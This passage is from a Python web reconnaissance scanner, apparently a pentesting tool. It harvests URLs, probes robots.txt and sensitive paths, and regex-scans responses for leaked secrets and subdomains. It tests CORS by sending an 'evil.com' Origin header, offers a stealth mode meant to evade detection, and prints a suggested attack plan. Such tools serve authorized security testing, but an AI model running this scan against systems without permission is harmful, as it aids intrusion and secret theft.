            "Origin": "https://evil.com"
        }
        resp = session.get(url, headers=headers, verify=False, timeout=8)
        
        # Ignorar si es un 404 ciego o vacio a menos que tenga data interesante
        if resp.status_code == 404 and "API" not in resp.text and "Cannot" not in resp.text: 
            return None

        # Truncate body to prevent ReDoS on massive JS/JSON files
        body = resp.text[:250000] 
        findings = defaultdict(list)

        for category, rules in REGEX_SUITE.items():
            for pattern, icon, validator in rules:
                for match in re.finditer(pattern, body):
                    val = match.group(1) if match.lastindex else match.group(0)
                    if validator(val):
                        findings[category].append(f"{icon}: {val}")

        hints, endpoints = analyze_comments_and_js(body)
        findings["🧰 SERVER / TECH"].extend(list(analyze_headers(resp)))
        
        # CORS Misconfiguration Check
        allow_origin = resp.headers.get("Access-Control-Allow-Origin", "")
        allow_creds = resp.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if "evil.com" in allow_origin and allow_creds:
            findings["🔥 CRITICAL SECRETS"].append(f"🔓 CORS Vulnerable: Configuración permisiva en {url} permite robo de sesión.")

        findings["🔥 CRITICAL SECRETS"].extend(analyze_sensitive_exposure(url, resp))
        findings["🎯 INJECTION CANDIDATES"].extend(list(analyze_url_params(url)))
        findings["🧠 DEVELOPER HINTS"].extend(list(hints))
        
        # Subdomain leaks extraction
        try:
            base_domain = url.split("://")[1].split("/")[0].split(":")[0]
            domain_parts = base_domain.split(".")
            if len(domain_parts) >= 2:
                root_domain = f"{domain_parts[-2]}.{domain_parts[-1]}"
                subdomains = re.findall(rf"([a-zA-Z0-9.-]+\.{root_domain})", body)
                subdomains = list(set([s for s in subdomains if s != base_domain]))
                if subdomains:
                    findings["🗺️ ATTACK SURFACE"].extend([f"🌐 Subdomain Leak: {s}" for s in subdomains[:10]])
        except Exception:
            pass

        findings["🗺️ ATTACK SURFACE"].extend(list(endpoints))
        findings["🗺️ ATTACK SURFACE"].extend(list(analyze_forms(body)))
        if detect_dir_listing(body):
            findings["🗺️ ATTACK SURFACE"].append(f"📂 Directory Listing abierto: {url}")

        # Threat-intel resuelto AQUÍ (no al imprimir): así soltamos el body y no
        # lo guardamos en RAM para cientos de URLs. 'kb' alimenta el triaje final.
        kb_hits = [name for name, info in VULN_KB.items()
                   if any(re.search(p, body, re.IGNORECASE) for p in info["patterns"])]

        for k in findings:
            findings[k] = sorted(list(set(findings[k])))

        return {
            "url": url,
            "status": resp.status_code,
            "findings": dict(findings),
            "kb": kb_hits,
        }
    except Exception as e:
        return {"url": url, "error": str(e)}

def main():
    # --- NEW: argparse-based CLI for --stealth and --output-format flags ---
    # Backward-compatible: positional log_file is still the first arg, no flags required.
    global MAX_THREADS, STEALTH_MODE

    parser = argparse.ArgumentParser(
        description=f"PHANTOM WEB INSPECTOR v{VERSION} — {CODENAME}",
        add_help=False,  # Avoid collision with -h for help vs future flags
    )
    parser.add_argument("log_file", nargs="?", help="Input log file (Feroxbuster JSON or raw URL list), optional if piping via STDIN")
    parser.add_argument("--stealth", action="store_true", default=False,
                        help="Stealth mode: reduce threads to 5, add random delay (0.5-2s) between requests")
    parser.add_argument("--json", type=str, help="Output file path for JSON format")
    parser.add_argument("--markdown", type=str, help="Output file path for Markdown format")
    parser.add_argument("-h", "--help", action="help", help="Show this help message")
    args = parser.parse_args()

    # Detect piped input
    has_stdin = not sys.stdin.isatty()

    if not args.log_file and not has_stdin:
        console.print("[red]Usage: python3 web_inspector.py <log_file> [--stealth] [--json <file>] [--markdown <file>][/red]")
        console.print("[yellow]Hint: You can also pipe output directly, e.g., cat urls.txt | python3 web_inspector.py[/yellow]")
        return

    log_file = args.log_file
    is_direct_url = False
    if log_file and (log_file.startswith("http://") or log_file.startswith("https://")):
        is_direct_url = True
    elif log_file and not os.path.exists(log_file):
        console.print(f"[red]Log file not found: {log_file}[/red]")
        return

    # --- Apply stealth mode settings ---
    if args.stealth:
        STEALTH_MODE = True
        MAX_THREADS = 5
        console.print("[yellow]🥷 Stealth mode: 5 threads, random delay 0.5-2s between requests[/yellow]")

    console.print(Panel.fit(
        f"[bold gold1]PHANTOM WEB INSPECTOR v{VERSION}[/bold gold1]\n"
        f"[grey50]Codename: {CODENAME} | Multi-Threaded Vulnerability Engine[/grey50]",
        border_style="cyan",
        box=box.DOUBLE
    ))

    urls = set()
    
    if is_direct_url:
        urls.add(log_file)
    else:
        # Smart Parsing: Detect if JSON (Feroxbuster) or Raw Text
        try:
            # Define the source stream: file or standard input
            stream = open(log_file, "r", encoding="utf-8", errors="ignore") if log_file else sys.stdin
            for line in stream:
                line = line.strip()
                if not line: continue
                try:
                    # Attempt JSON line parsing (Feroxbuster --json output)
                    data = json.loads(line)
                    if "url" in data:
                        # Optimization: Skip fetching known 404s/400s generated by Feroxbuster
                        status = data.get("status", 200)
                        if status in [404, 400]: 
                            continue 
                        urls.add(data["url"])
                except json.JSONDecodeError:
                    # Fallback to Regex if it's a normal text file
                    clean = re.sub(r"\x1b\[[0-9;]*[mK]", "", line)
                    found = re.findall(r"http[s]?://[a-zA-Z0-9\.\-\/\_\?\=\&\%\:]+", clean)
                    urls.update(found)
                if log_file:
                    stream.close()
        except Exception as e:
            console.print(f"[red]Error reading input: {e}[/red]")
            return

    session = get_session()

    # --- ACTIVE RECON: robots.txt + sitemap.xml + rutas de alto valor por origen ---
    origins = origins_from_urls(urls)
    if origins:
        console.print(f"[cyan]🤖 Recon activo en {len(origins)} origen(es): robots.txt · sitemap.xml · {len(HIGH_VALUE_PATHS)} rutas de alto valor...[/cyan]")
        extra, robots_hints = seed_recon(origins, session)
        before = len(urls)
        urls.update(extra)
        console.print(f"[grey50]   + {len(urls) - before} endpoints nuevos sembrados.[/grey50]")
        if robots_hints:
            console.print(Panel(
                "\n".join(sorted(set(robots_hints))[:40]),
                title="🤖 robots.txt — rutas que el server prefiere ocultar",
                border_style="yellow", expand=False))

    # Filter out static files like images/css before starting the scan
    sorted_urls = sorted([u for u in urls if not is_boring_asset(u)])

    if not sorted_urls:
        console.print("[yellow][!] No valid/interesting endpoints to inspect.[/yellow]")
        return

    all_results = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None, style="cyan"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Scanning target memory...", total=len(sorted_urls))
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            future_to_url = {executor.submit(inspect_target, url, session): url for url in sorted_urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    res = future.result()
                    if res and not res.get("error"):
                        all_results.append(res)
                        
                        # Print Only if Findings Exist (Anti-Spam)
                        if "findings" in res and any(res["findings"].values()):
                            
                            # Threat Intel DB Check (desde los nombres ya resueltos)
                            for p in threat_panels(res.get("kb", [])):
                                console.print(p)

                            # Results Table
                            status_color = "green" if res['status'] < 400 else ("yellow" if res['status'] < 500 else "red")
                            table = Table(title=f"Target: {url} [{status_color}]{res['status']}[/]", box=box.ROUNDED, show_header=True, header_style="bold cyan", expand=True)
                            table.add_column("Category", style="magenta", width=25)
                            table.add_column("Intel Discovered", style="grey70")
                            
                            found_any = False
                            for cat, items in res["findings"].items():
                                if items:
                                    found_any = True
                                    # Escapar datos del target para que corchetes no rompan el markup de rich
                                    display_items = [escape(str(x)) for x in items[:5]]
                                    if len(items) > 5:
                                        display_items.append(f"[italic red]+ {len(items) - 5} more vectors (saved to log)...[/italic red]")
                                    table.add_row(escape(str(cat)), "\n".join(display_items))
                            
                            if found_any:
                                console.print(table)
                except Exception as exc:
                    pass # Silently drop timeouts to keep console clean
                
                progress.advance(task)

    # --- PLAN DE ATAQUE: síntesis priorizada de todo lo encontrado ---
    triage = build_triage(all_results)
    if triage:
        prio_style = {0: "bold red", 1: "bold magenta", 2: "bold yellow", 3: "cyan"}
        prio_tag = {0: "CRÍTICO", 1: "ALTO", 2: "MEDIO", 3: "INFO"}
        lines = []
        for i, (prio, text) in enumerate(triage[:25], 1):
            tag = prio_tag.get(prio, "INFO")
            lines.append(f"[{prio_style.get(prio,'white')}]{i:>2}. [{tag}][/] {text}")
        console.print(Panel(
            "\n".join(lines),
            title="🎯 PLAN DE ATAQUE SUGERIDO (priorizado)",
            border_style="bold red", expand=True, box=box.DOUBLE))

    # Output persistence (unique per input log so parallel per-port scans don't clobber each other)
    report = {
        "results": all_results,
        "triage": [{"priority": p, "action": t} for p, t in triage],
    }

    # Export options handling
    log_tag = os.path.splitext(os.path.basename(log_file))[0] if log_file else "piped_input"
    
    file_json = args.json if args.json else f"web_inspector_{log_tag}.json"
    file_md = args.markdown if args.markdown else f"web_inspector_{log_tag}.md"
    
    if args.markdown or (not args.json and not args.markdown):
        # By default (or if --markdown specified), generate JSON + Markdown
        with open(file_json, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
        _export_markdown(report, file_md)
        output_file = f"{file_json} y {file_md}"
    elif args.json:
        # Only JSON generated
        with open(file_json, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
        output_file = file_json

    console.print(f"\n[bold green]✔ Web Inspection Complete.[/bold green]")
    console.print(f"[cyan]Total Extracted Endpoints:[/cyan] {len(sorted_urls)}")
    console.print(f"[cyan]Vulnerable/Leaking Targets:[/cyan] {len([r for r in all_results if 'findings' in r and any(r['findings'].values())])}")
    console.print(f"[cyan]Acciones de ataque sugeridas:[/cyan] {len(triage)}")
    console.print(f"[gold1]Technical intel logged to: [underline]{output_file}[/underline][/gold1]\n")

if __name__ == "__main__":
    main()
